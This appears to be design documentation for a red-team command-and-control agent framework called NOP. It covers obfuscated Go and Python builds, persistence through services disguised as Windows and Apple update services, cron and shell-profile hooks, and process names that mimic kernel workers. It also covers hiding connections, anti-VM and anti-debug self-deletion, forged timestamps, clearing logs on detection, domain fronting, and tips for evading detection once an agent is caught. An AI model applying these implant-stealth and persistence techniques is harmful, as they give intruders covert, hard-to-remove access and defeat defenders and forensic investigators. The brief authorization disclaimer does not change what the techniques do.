# Agent Obfuscation, Persistence & Stealth Features

## Overview

NOP agents can be configured with varying levels of obfuscation, persistence, and stealth to evade detection and maintain operation in target environments.

## Go Agent Compilation & Obfuscation

### Build Pipeline

Go agents are compiled to native executables for each target platform:

```bash
# Standard Build
GOOS=linux GOARCH=amd64 go build -o nop-agent-linux

# Obfuscated Build (using Garble)
GOOS=linux GOARCH=amd64 garble -literals -tiny -seed=random build -o nop-agent-linux

# Production Build (fully optimized)
GOOS=linux GOARCH=amd64 garble -literals -tiny -seed=random build \
  -ldflags="-s -w -X main.version=1.0.0" \
  -trimpath \
  -o nop-agent-linux

# Compressed Build (using UPX)
upx --best --lzma nop-agent-linux
```

### Obfuscation Features

When **obfuscate = true**:

1. **Symbol Obfuscation** (Garble)
   - Function names randomized
   - Variable names obfuscated
   - Package names scrambled
   
2. **String Obfuscation**
   - All strings encrypted at compile time
   - Decrypted at runtime
   - C2 URLs hidden
   
3. **Control Flow Flattening**
   - Function logic obfuscated
   - Makes reverse engineering harder
   
4. **Debug Symbol Stripping**
   - `-ldflags="-s -w"`
   - Removes debugging information
   - Smaller binary size
   
5. **UPX Compression**
   - LZMA compression
   - Further obfuscates binary structure
   - Reduces file size by 60-70%

### Cross-Compilation Targets

| Platform | GOOS | GOARCH | Output |
|----------|------|--------|--------|
| Linux AMD64 | linux | amd64 | nop-agent-linux |
| Linux ARM64 | linux | arm64 | nop-agent-arm |
| Windows AMD64 | windows | amd64 | nop-agent.exe |
| Windows 386 | windows | 386 | nop-agent-x86.exe |
| macOS AMD64 | darwin | amd64 | nop-agent-macos |
| macOS ARM64 | darwin | arm64 | nop-agent-macos-arm |
| FreeBSD | freebsd | amd64 | nop-agent-freebsd |

## Startup Modes

### AUTO (Auto-Startup)

Agent installs itself and starts on boot:

**Linux (systemd)**:
```ini
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/nop-agent
Restart=always
RestartSec=10s

[Install]
WantedBy=multi-user.target
```

**Windows (Service)**:
```powershell
sc.exe create "Windows Update Service" binPath= "C:\Windows\System32\svchost.exe"
```

**macOS (LaunchAgent)**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdater</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/nop-agent</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
```

### SINGLE (Single-Run)

Agent executes once and exits:
- No persistence installation
- Runs until manual termination or task completion
- Useful for one-time data collection

## Persistence Levels

### LOW (No Persistence)

- **Behavior**: Runs once, no restart mechanisms
- **Detection Risk**: Very Low
- **Use Case**: Quick reconnaissance, temporary access
- **Features**:
  - No installation
  - Memory-resident only option
  - Self-deletes on exit

### MEDIUM (Standard Persistence)

- **Behavior**: Restarts on failure, removable by user
- **Detection Risk**: Low-Medium
- **Use Case**: Long-term monitoring, standard deployments
- **Features**:
  - Systemd/Service/LaunchAgent installation
  - Restart on crash (max 5 attempts)
  - Visible in service lists
  - Standard process name

### HIGH (Advanced Persistence)

- **Behavior**: Multiple persistence mechanisms, hidden operation
- **Detection Risk**: Medium-High (but hard to remove)
- **Use Case**: Critical long-term access, hostile environments
- **Features**:
  - **Multiple Installation Points**:
    - Systemd service
    - Cron job (`@reboot`)
    - .bashrc/.profile hooks
    - Boot scripts
  - **Rootkit-like Behavior**:
    - Hidden from `ps` (process name mimicry)
    - Hidden from `netstat` (connection hiding)
    - Watchdog process (restarts main agent)
  - **Process Hiding**:
    - Mimics system processes (`[kworker/0:0]`, `systemd-udevd`)
    - Randomized process names
  - **File Hiding**:
    - Hidden directories (`.` prefix, system paths)
    - File attribute manipulation (`chattr +i`)
  - **Anti-Forensics**:
    - Clears logs on detection
    - Self-destructs if debugger detected
    - Encrypted memory regions

## Stealth Features

### Process Name Obfuscation

```go
// Mimic system process
procNames := []string{
    "[kworker/0:0]",
    "systemd-udevd",
    "NetworkManager",
    "gdm-session-worker",
}
randomName := procNames[rand.Intn(len(procNames))]
```

### Network Traffic Obfuscation

- **Domain Fronting**: C2 traffic via CDN (Cloudflare, Akamai)
- **Protocol Mimicry**: HTTP/HTTPS with legitimate User-Agent
- **Jitter**: Randomized beacon intervals (300s-900s)
- **Sleep Mode**: No activity during business hours (configurable)

### Detection Evasion

```go
// Anti-VM Detection
func isVM() bool {
    // Check DMI information
    // Check MAC address prefixes
    // Check CPU count/memory
    return detected
}

// Anti-Debugging
func isDebugged() bool {
    // Check ptrace
    // Check /proc/self/status
    // Timing attacks
    return detected
}

// Self-Destruct on Detection
if isVM() || isDebugged() {
    os.Remove(os.Args[0])  // Delete binary
    os.Exit(0)
}
```

### File Timestamp Manipulation

```go
// Match timestamps to system files
referenceFile := "/bin/ls"
stat, _ := os.Stat(referenceFile)
os.Chtimes(agentPath, stat.ModTime(), stat.ModTime())
```

## Python Agent Obfuscation

Python agents use PyInstaller with obfuscation:

```bash
# Standard Build
pyinstaller --onefile --name nop-agent agent.py

# Obfuscated Build
python -m pyarmor obfuscate --restrict 0 agent.py
pyinstaller --onefile --name nop-agent obfuscated/agent.py

# Embedded Python (no external dependencies)
pyinstaller --onefile --hidden-import=scapy --hidden-import=psutil agent.py
```

**Obfuscation Techniques**:
- PyArmor bytecode encryption
- String obfuscation
- Dead code injection
- Control flow obfuscation

## Configuration Examples

### Stealthy Long-Term Agent

```json
{
  "name": "DC-Monitor",
  "agent_type": "go",
  "obfuscate": true,
  "startup_mode": "auto",
  "persistence_level": "high",
  "capabilities": {
    "asset": true,
    "traffic": true,
    "host": true,
    "access": false
  }
}
```

### Quick Reconnaissance Agent

```json
{
  "name": "Recon-Alpha",
  "agent_type": "python",
  "obfuscate": false,
  "startup_mode": "single",
  "persistence_level": "low",
  "capabilities": {
    "asset": true,
    "traffic": false,
    "host": false,
    "access": false
  }
}
```

### Standard Monitoring Agent

```json
{
  "name": "Branch-Office",
  "agent_type": "go",
  "obfuscate": true,
  "startup_mode": "auto",
  "persistence_level": "medium",
  "capabilities": {
    "asset": true,
    "traffic": true,
    "host": true,
    "access": false
  }
}
```

## Security Considerations

### Legal & Ethical

- **Authorization Required**: Only deploy on networks you own or have written permission to test
- **Red Team Operations**: Document authorization and scope
- **Penetration Testing**: Follow rules of engagement

### Operational Security

1. **C2 Infrastructure**:
   - Use redirectors (Apache mod_rewrite, Nginx)
   - Separate domains for different campaigns
   - Monitor C2 logs for detection attempts

2. **Agent Deployment**:
   - Verify target environment first
   - Test in isolated lab before production
   - Have kill switch/self-destruct mechanism

3. **Data Handling**:
   - Encrypt all C2 communications (TLS)
   - Sanitize sensitive data before exfiltration
   - Secure deletion of logs

## Build Automation

Example build script (`build-agent.sh`):

```bash
#!/bin/bash

AGENT_ID=$1
AGENT_TYPE=$2
OBFUSCATE=$3
PLATFORM=$4

if [ "$AGENT_TYPE" == "go" ]; then
    if [ "$OBFUSCATE" == "true" ]; then
        garble -literals -tiny build -ldflags="-s -w" -o "agent-$AGENT_ID-$PLATFORM"
        upx --best --lzma "agent-$AGENT_ID-$PLATFORM"
    else
        go build -o "agent-$AGENT_ID-$PLATFORM"
    fi
elif [ "$AGENT_TYPE" == "python" ]; then
    if [ "$OBFUSCATE" == "true" ]; then
        pyarmor obfuscate agent.py
        pyinstaller --onefile obfuscated/agent.py -n "agent-$AGENT_ID"
    else
        pyinstaller --onefile agent.py -n "agent-$AGENT_ID"
    fi
fi
```

## Performance Impact

| Feature | Binary Size | Memory Usage | CPU Usage | Detection Risk |
|---------|-------------|--------------|-----------|----------------|
| No Obfuscation | 8 MB | 20 MB | 1-2% | High |
| Garble Only | 8 MB | 22 MB | 1-2% | Medium |
| Garble + UPX | 3 MB | 25 MB | 2-3% | Low |
| High Persistence | 3 MB | 30 MB | 3-5% | Low-Medium |

## Troubleshooting

### Agent Not Starting

- Check system logs (`journalctl -u service-name`)
- Verify file permissions (executable bit set)
- Test with `--debug` flag for verbose output

### Agent Detected

- Increase obfuscation level
- Change process name patterns
- Adjust beacon intervals
- Use domain fronting

### Connection Failures

- Verify C2 server is running
- Check firewall rules
- Test with `telnet c2-server.com 443`
- Review TLS certificate validity

## References

- [Garble Obfuscator](https://github.com/burrowers/garble)
- [PyArmor](https://pyarmor.readthedocs.io/)
- [UPX Packer](https://upx.github.io/)
- [Red Team Infrastructure](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)
